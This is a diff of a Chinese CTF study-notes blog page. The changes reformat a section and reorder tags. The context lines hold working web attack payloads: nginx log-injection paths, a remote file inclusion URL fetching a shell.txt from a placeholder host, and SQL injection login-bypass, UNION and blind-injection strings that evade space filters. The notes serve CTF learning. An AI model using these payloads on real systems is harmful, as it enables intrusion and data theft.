@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/16/ILWYXHbtoV18fNR.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/zaKYEpvBQRwS6TG.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/COtNvaJyT5rZn41.png">
-<meta property="og:updated_time" content="2020-04-16T16:10:32.677Z">
+<meta property="og:updated_time" content="2020-04-16T16:30:07.842Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ctfshow 知识点积累">
 <meta name="twitter:description" content="ctf show 知识点积累">
@@ -233,7 +233,7 @@
 <h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><p> 请求头可以看到是Ubuntu nginx<br> nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.log<br> <img src="https://i.loli.net/2020/04/16/fAQ7FuLYvU4kDH3.png" alt="web4.png"><br>默认目录：<code>?url=/var/log/nginx/access.log</code><br><a href="https://blog.csdn.net/weixin_33922670/article/details/93996624" target="_blank" rel="noopener">默认日志和配置文件路径</a><br>access.log 记录了哪些用户，哪些页面以及用户浏览器、ip和其他的访问信息。 </p>
 <p>burp参数然后写入一句话链接。  </p>
 <h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p><code>?url=http://xxx.xxx.xxx.xxx/shell.txt</code>  </p>
-<h2 id="web-6"><a href="#web-6" class="headerlink" title="web 6"></a>web 6</h2><p>fuzz发现所有带空格的都返回error，所以空格被过滤。<br><img src="https://i.loli.net/2020/04/16/j9YdAozNBWcnei1.png" alt="web 6.png"><br><img src="https://i.loli.net/2020/04/16/UYR9eTtxVpBh5ci.png" alt="web 6.2.png"><br><img src="https://i.loli.net/2020/04/16/ICgaYNvrMqe7OAo.png" alt="web6.3.png"><br>过滤空格。用/<strong>/<br>`username=admin&amp;password=’or/</strong>/1=1#<code>登录</code>username=admin&amp;password=’union/<strong>/select/</strong>/1,database(),3#<code></code>username=admin&amp;password=’union/<strong>/select/</strong>/1,database(),3#`   和5的位置一样。  </p>
+<h2 id="web-6"><a href="#web-6" class="headerlink" title="web 6"></a>web 6</h2><p>fuzz发现所有带空格的都返回error，所以空格被过滤。<br><img src="https://i.loli.net/2020/04/16/j9YdAozNBWcnei1.png" alt="web 6.png"><br><img src="https://i.loli.net/2020/04/16/UYR9eTtxVpBh5ci.png" alt="web 6.2.png"><br><img src="https://i.loli.net/2020/04/16/ICgaYNvrMqe7OAo.png" alt="web6.3.png"><br>过滤空格。用<code>/**/</code><br><code>username=admin&amp;password=&#39;or/**/1=1#</code> 登录<br><code>username=admin&amp;password=&#39;union/**/select/**/1,database(),3#</code><br><code>username=admin&amp;password=&#39;union/**/select/**/1,database(),3#</code>   和5的位置一样。  </p>
 <h2 id="web7-过滤空格的盲注"><a href="#web7-过滤空格的盲注" class="headerlink" title="web7 过滤空格的盲注"></a>web7 过滤空格的盲注</h2><p><code>?id=1/**/or/**/ascii(substr(database(),1,1))&gt;1000%23</code><br><img src="https://i.loli.net/2020/04/16/zQkTr42LudZsOpF.png" alt="web7 1000.png"><br><code>?id=1/**/or/**/ascii(substr(database(),1,1))&gt;1%23</code><br><img src="https://i.loli.net/2020/04/16/h3V61tSCTKiBY28.png" alt="web7 1.png"><br>表名<code>id=-1&#39;/**/or/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),1,1))&gt;1#</code>  </p>
 <h2 id="web8-过滤逗号-空格的盲注"><a href="#web8-过滤逗号-空格的盲注" class="headerlink" title="web8 过滤逗号 空格的盲注"></a>web8 过滤逗号 空格的盲注</h2><p>又学到了新的bypass。<br>过滤逗号：  </p>
 <ul>
@@ -552,7 +552,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">xun9er日常废话</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">刷题笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">php序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">VS code</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -576,15 +596,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">md5</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">preg_replace</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -597,10 +621,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">xun9er日常废话</a>
               </li>
              
               <li class="article-tag-list-item">
